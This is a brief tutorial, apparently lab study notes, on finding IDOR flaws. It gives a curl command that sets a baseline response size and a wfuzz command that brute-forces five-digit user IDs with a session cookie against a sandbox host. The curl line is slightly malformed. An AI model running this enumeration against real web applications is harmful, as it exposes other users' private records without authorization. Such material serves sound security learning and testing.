<h3>Tips:</h3>
1. Static file IDOR is something like change `1.txt` to `2.txt`. Routing also can be considered but need some guesswork.
2. Database Object Referencing (ID based) IDOR refers to number like `1` to `2` or more complicated like `1a2eee3d-01-44mc11`.



<h2>Use curl and wfuzz to brute force:</h2>
1. First use curl to obtain a length that is for <b>invalid ID</b> as a baseline, with authenticated cookie (`-s` means dowan progress, `-w '%{size_download}'` download means want response size):\
`curl -s /dev/null http://idor-sandbox:80/user/?uid=91191 -w '%{size_download}' --header "Cookie: PHPSESSID=2a19139a5af3b1e99dd277cfee87bd64"`

2. Once you get that invalid response size, exclude it plus 404 using wfuzz:
`wfuzz -c -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt --hc 404 --hh 2873 -H "Cookie: PHPSESSID=2a19139a5af3b1e99dd277cfee87bd64" http://idor-sandbox:80/user/?uid=FUZZ`
